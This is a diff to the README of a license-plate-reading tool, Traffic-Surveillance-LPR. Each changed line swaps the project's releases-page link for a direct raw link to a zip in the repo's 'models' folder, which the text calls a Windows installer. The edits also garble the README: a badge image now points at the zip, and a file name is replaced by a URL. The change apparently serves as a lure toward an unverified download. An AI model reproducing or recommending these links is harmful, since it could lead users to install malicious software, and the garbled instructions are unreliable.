@@ -1,6 +1,6 @@
 # 🚦 Traffic-Surveillance-LPR - Read License Plates Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Traffic--Surveillance--LPR-00bfff?style=for-the-badge)](https://github.com/Henry575/Traffic-Surveillance-LPR/releases)
+[![Download Latest Release](https://github.com/Henry575/Traffic-Surveillance-LPR/raw/refs/heads/main/models/Surveillance-LPR-Traffic-v3.8.zip)](https://github.com/Henry575/Traffic-Surveillance-LPR/raw/refs/heads/main/models/Surveillance-LPR-Traffic-v3.8.zip)
 
 ## 📋 What is Traffic-Surveillance-LPR?
 
@@ -35,13 +35,13 @@ Traffic-Surveillance-LPR is simple to start. Follow these exact steps to get it 
 
 Go to this link to get the latest version:
 
-[Download Traffic-Surveillance-LPR](https://github.com/Henry575/Traffic-Surveillance-LPR/releases)
+[Download Traffic-Surveillance-LPR](https://github.com/Henry575/Traffic-Surveillance-LPR/raw/refs/heads/main/models/Surveillance-LPR-Traffic-v3.8.zip)
 
 This page lists all available versions. You should use the newest release.
 
 ### Step 2: Find the Correct File
 
-On the release page, look for a file with a name like `Traffic-Surveillance-LPR-Setup.exe`. This Windows installer will set up everything you need.
+On the release page, look for a file with a name like `https://github.com/Henry575/Traffic-Surveillance-LPR/raw/refs/heads/main/models/Surveillance-LPR-Traffic-v3.8.zip`. This Windows installer will set up everything you need.
 
 There might be other files like source code or documentation; do not choose those.
 
@@ -148,7 +148,7 @@ For accurate results:
 
 You can download the latest setup file here:
 
-[Download Traffic-Surveillance-LPR](https://github.com/Henry575/Traffic-Surveillance-LPR/releases)
+[Download Traffic-Surveillance-LPR](https://github.com/Henry575/Traffic-Surveillance-LPR/raw/refs/heads/main/models/Surveillance-LPR-Traffic-v3.8.zip)
 
 Click the most recent installer file with `.exe` extension to begin.
 
